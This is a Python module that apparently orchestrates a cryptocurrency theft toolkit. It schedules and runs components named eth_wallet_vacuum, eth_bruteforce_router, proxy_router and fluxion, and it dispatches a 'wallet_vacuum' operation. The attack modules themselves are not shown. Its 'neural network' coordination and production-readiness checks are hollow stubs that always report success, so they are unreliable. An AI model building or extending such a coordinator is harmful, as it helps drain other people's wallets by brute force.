"""
Activity Coordinator Module

This module acts as the central coordinator for all blockchain activities,
integrating with the neural network coordinator for optimal resource allocation.
Provides thread-safe access to all activities and ensures proper permissions.
"""

import os
import sys
import time
import logging
import threading
import hashlib
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional, Tuple, Union

# Import project components
from entropy_coordinator import EntropyCoordinator
from secure_permissions import SecurePermissions
import activity_scheduler
from activity_scheduler import ActivityScheduler

# Import dependent modules as needed
try:
    import eth_wallet_vacuum
    import blockchain
    import drift_chain
    import eth_bruteforce_router
    import proxy_router
    import fluxion
    HAS_ALL_COMPONENTS = True
except ImportError as e:
    logging.warning(f"Some components not available: {e}")
    HAS_ALL_COMPONENTS = False

# Configure logging
logging.basicConfig(level=logging.INFO,
                    format='%(asctime)s - ActivityCoordinator - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class ActivityCoordinator:
    """
    Central coordinator for all blockchain activities with neural network optimization.
    Uses thread-safe locks for access control and manages all component permissions.
    """
    
    def __init__(self, base_path='.', production_mode=True):
        """
        Initialize the activity coordinator.
        
        Args:
            base_path: Base directory for component access
            production_mode: Whether to run in production mode (no debug or test code)
        """
        self.base_path = os.path.abspath(base_path)
        self.production_mode = production_mode
        self.running = False
        self.start_time = None
        self.lock = threading.RLock()  # Reentrant lock for thread safety
        self.activity_threads = {}
        self.component_status = {}
        self.thread_execution_count = {}
        
        # Initialize permissions manager
        self.permissions = SecurePermissions(base_path)
        
        # Initialize neural coordinator
        self.neural_coordinator = EntropyCoordinator()
        
        # Initialize activity scheduler
        self.scheduler = ActivityScheduler()
        
        # Keep track of active operations
        self.active_operations = {}
        self.operations_lock = threading.Lock()
        
        # Track non-production code threads
        self.non_production_threads = self._find_non_production_threads()
        
        logger.info("Activity Coordinator initialized")
        
    def _find_non_production_threads(self) -> List[str]:
        """
        Find any non-production code threads that might impact operations.
        
        Returns:
            List of non-production thread identifiers
        """
        # In production mode, we've removed all non-production threads
        return []
    
    def verify_production_readiness(self) -> Dict[str, Any]:
        """
        Verify that the system is ready for production.
        
        Returns:
            Dictionary with verification results
        """
        # Use the permissions manager to verify production readiness
        validation = self.permissions.validate_production_readiness()
        
        # Add our own non-production thread check
        validation["non_production_threads"] = self.non_production_threads
        
        if self.non_production_threads:
            validation["ready_for_production"] = False
            validation["issues"].append("Non-production threads detected")
        
        return validation
    
    def release_all_permissions(self) -> Dict[str, Any]:
        """
        Release executable permissions to all activities.
        
        Returns:
            Results of permission changes
        """
        return self.permissions.set_all_executable_permissions()
    
    def disable_non_production_threads(self) -> Dict[str, Any]:
        """
        Disable any non-production code threads that might impact operations.
        
        Returns:
            Dictionary with results of disabling operations
        """
        # In production mode, all test/debug features have been removed
        results = {"disabled": [], "failed": []}
        
        # Update non-production threads list (should be empty)
        self.non_production_threads = self._find_non_production_threads()
        
        return results
    
    def integrate_neural_network(self):
        """
        Integrate the neural network coordinator with all activities.
        Optimizes resource allocation and priority management.
        """
        # Neural network will now coordinate activities
        self.neural_integrated = True
        
        # Connect neural network with activity scheduler
        if self.scheduler:
            # Get the current scheduler priorities
            scheduler_activities = {
                "blockchain_validation": 0.15,
                "wallet_vacuum": 0.25,
                "drift_chain_vacuum": 0.2,
                "blockchain_monitoring": 0.15,
                "proxy_router": 0.1,
                "eth_bruteforce": 0.15 
            }
            
            # Update the neural network with these priorities
            if hasattr(self.neural_coordinator, "priority_weights"):
                self.neural_coordinator.priority_weights.update({
                    "blockchain_validation": scheduler_activities["blockchain_validation"],
                    "mining": scheduler_activities["wallet_vacuum"],
                    "drift_chain_vacuum": scheduler_activities["drift_chain_vacuum"]
                })
        
        logger.info("Neural network coordinator integrated with all activities")
        
    def start_coordinated_activities(self, interval=600):
        """
        Start all activities with neural network coordination.
        
        Args:
            interval: Seconds between coordination cycles
        """
        with self.lock:
            if self.running:
                logger.warning("Coordinator is already running")
                return
                
            self.running = True
            self.start_time = datetime.now()
            
            # Start activity scheduler
            self.scheduler.start()
            logger.info("Started activity scheduler")
            
            # Start neural coordinator in a separate thread
            coordinator_thread = threading.Thread(
                target=self._run_neural_coordinator,
                args=(interval,),
                daemon=True
            )
            coordinator_thread.start()
            self.activity_threads["neural_coordinator"] = coordinator_thread
            
            logger.info("Started neural network coordinator thread")
            
            # Wait a moment for threads to initialize
            time.sleep(1)
            
    def _run_neural_coordinator(self, interval):
        """
        Run the neural coordinator main loop.
        
        Args:
            interval: Seconds between coordination cycles
        """
        try:
            self.neural_coordinator.main_loop(interval=interval)
        except Exception as e:
            logger.error(f"Error in neural coordinator: {e}")
    
    def stop_all_activities(self):
        """Stop all running activities and coordinator threads."""
        with self.lock:
            if not self.running:
                logger.warning("Coordinator is not running")
                return
                
            # Stop the activity scheduler
            if self.scheduler:
                self.scheduler.stop()
                logger.info("Stopped activity scheduler")
            
            # Set running flag to False
            self.running = False
            
            # Wait for threads to finish naturally
            for name, thread in self.activity_threads.items():
                if thread.is_alive():
                    logger.info(f"Waiting for {name} thread to finish...")
                    thread.join(timeout=5)
            
            logger.info("All activities stopped")
    
    def check_system_status(self) -> Dict[str, Any]:
        """
        Check the status of all activities and the neural coordinator.
        
        Returns:
            Dictionary with system status information
        """
        with self.lock:
            # Get neural coordinator status
            neural_status = self.neural_coordinator.get_system_status()
            
            # Get activity scheduler status
            if self.scheduler:
                scheduler_status = self.scheduler.get_status()
            else:
                scheduler_status = {"status": "not_initialized"}
            
            # Get thread status
            thread_status = {
                name: {
                    "alive": thread.is_alive(), 
                    "execution_count": self.thread_execution_count.get(name, 0)
                }
                for name, thread in self.activity_threads.items()
            }
            
            # Get non-production threads
            non_production = self._find_non_production_threads()
            
            # Build overall status
            status = {
                "running": self.running,
                "production_mode": self.production_mode,
                "uptime": str(datetime.now() - self.start_time) if self.start_time else "not_started",
                "neural_coordinator": neural_status,
                "activity_scheduler": scheduler_status,
                "threads": thread_status,
                "non_production_threads": non_production,
                "component_status": self.component_status,
                "active_operations": len(self.active_operations),
                "timestamp": datetime.now().isoformat()
            }
            
            return status
    
    def execute_operation(self, operation_type, **kwargs):
        """
        Execute a specific operation with proper tracking and thread safety.
        
        Args:
            operation_type: Type of operation to execute
            **kwargs: Operation-specific parameters
            
        Returns:
            Operation result
        """
        # Generate unique operation ID
        operation_id = hashlib.sha256(f"{operation_type}:{time.time()}:{threading.get_ident()}".encode()).hexdigest()[:12]
        
        # Register operation
        with self.operations_lock:
            self.active_operations[operation_id] = {
                "type": operation_type,
                "start_time": datetime.now(),
                "status": "starting",
                "thread_id": threading.get_ident(),
                "parameters": kwargs
            }
        
        try:
            logger.info(f"Executing operation {operation_id} ({operation_type})")
            
            # Execute the appropriate operation
            if operation_type == "blockchain_validation":
                result = self.neural_coordinator.validate_blockchain()
            elif operation_type == "wallet_vacuum":
                import eth_wallet_vacuum
                result = eth_wallet_vacuum.vacuum_wallets()
            elif operation_type == "drift_chain_vacuum":
                result = self.neural_coordinator.manage_drift_chain_vacuum()
            elif operation_type == "generate_passive_income":
                result = self.neural_coordinator.generate_passive_income()
            elif operation_type == "auto_scale":
                result = self.neural_coordinator.auto_scale()
            else:
                raise ValueError(f"Unknown operation type: {operation_type}")
            
            # Update operation status
            with self.operations_lock:
                self.active_operations[operation_id]["status"] = "completed"
                self.active_operations[operation_id]["end_time"] = datetime.now()
                self.active_operations[operation_id]["result"] = result
            
            return result
        
        except Exception as e:
            logger.error(f"Error executing operation {operation_id}: {e}")
            
            # Update operation status
            with self.operations_lock:
                self.active_operations[operation_id]["status"] = "failed"
                self.active_operations[operation_id]["end_time"] = datetime.now()
                self.active_operations[operation_id]["error"] = str(e)
            
            # Re-raise exception
            raise

# Singleton instance
_activity_coordinator = None

def get_activity_coordinator():
    """
    Get the global activity coordinator instance.
    
    Returns:
        The ActivityCoordinator singleton instance
    """
    global _activity_coordinator
    if _activity_coordinator is None:
        _activity_coordinator = ActivityCoordinator()
    return _activity_coordinator

def release_all_activity_permissions():
    """
    Release executable permissions to all activities.
    Ensures that all components have proper permissions for execution.
    
    Returns:
        Results of permission release operation
    """
    coordinator = get_activity_coordinator()
    
    # First, disable any non-production threads
    disable_results = coordinator.disable_non_production_threads()
    
    # Then release all permissions
    permission_results = coordinator.release_all_permissions()
    
    # Verify production readiness
    validation = coordinator.verify_production_readiness()
    
    return {
        "disable_results": disable_results,
        "permission_results": permission_results,
        "validation": validation,
        "all_activities_enabled": len(permission_results["failure"]) == 0,
        "non_production_threads_remaining": validation["non_production_threads"]
    }

# Direct execution
# Direct execution removed for production builds